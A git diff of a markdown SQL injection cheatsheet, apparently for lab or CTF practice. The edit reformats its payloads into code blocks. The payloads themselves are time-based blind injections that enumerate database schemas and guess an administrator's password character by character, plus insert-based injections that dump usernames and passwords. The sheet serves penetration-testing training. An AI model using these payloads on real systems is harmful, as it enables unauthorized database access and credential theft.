@@ -1,4 +1,4 @@
-# SQL Injection Cheatsheet
+ # SQL Injection Cheatsheet
 
 - [ ] Look for any endpoint/functionality that seems like it is touching the DB
     - Try injecting a single or double quote and look for changes in response
@@ -8,26 +8,58 @@
     - Visible errors
     - Conditional errors (e.g., divide by zero)
 - [ ] Check if you can trigger a conditional response
-- [ ] Try to trigger a time delay
-    - sleep
-    - Examples:
-        - `test@test.com' and 1=sleep(3);-- -`
-        - `' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--`
-        - `' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--`
-        - `' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-`
-        - `' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -`
+- [ ] Try to trigger a time delay - sleep
+
+```bash
+test@test.com' and 1=sleep(3);-- -
+```
+
+```bash
+' or 1=(SELECT SLEEP(3) FROM information_schema.SCHEMATA WHERE SCHEMA_NAME like 'i%' LIMIT 1 );--
+```
+
+```bash
+' or 1=(SELECT SLEEP(3) FROM information_schema.TABLES WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME like 'u%' LIMIT 1 );--
+```
+
+```bash
+' and (SELECT sleep(3) from information_schema.COLUMNS where TABLE_SCHEMA = 'sqli_four' and TABLE_NAME = 'users' and COLUMN_NAME like 'u%' LIMIT 1);--+-
+```
+
+```bash
+' AND 1=(SELECT sleep(3) FROM users WHERE username = 'administrator' AND password like 'a%' LIMIT 1);-- -
+```
+
 - [ ] Look for any input fields that may be inserting rows into the database and check those for injection as well.
 
 > [!warning] Be careful with testing this. Inserting rows into the db without consideration has the potential to break something in the application.
 
 - Examples
-    - `title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--`
-    - `title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--`
-    - `title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--`
+```bash
+title',(SELECT GROUP_CONCAT(DISTINCT TABLE_SCHEMA) FROM information_schema.tables));--
+```
+
+```bash
+title',(SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables where TABLE_SCHEMA='sqli_five'));--
+```
+
+```bash
+title',(SELECT GROUP_CONCAT(concat(id,':',username,':',password),'<br>') FROM sqli_five.users));--
+```
+
 - Blind insert examples
-    - `test',sleep(5),'');-- -`
-    - `',( select sleep(5) where version() like '8%' ) ,'');--`
-    - `',( select sleep(5) from flag where flag like 'a%' ),'');--`
+
+```bash
+test',sleep(5),'');-- -
+```
+
+```bash
+',( select sleep(5) where version() like '8%' ) ,'');--
+```
+
+```bash
+',( select sleep(5) from flag where flag like 'a%' ),'');--
+```
 
 # Labs
 
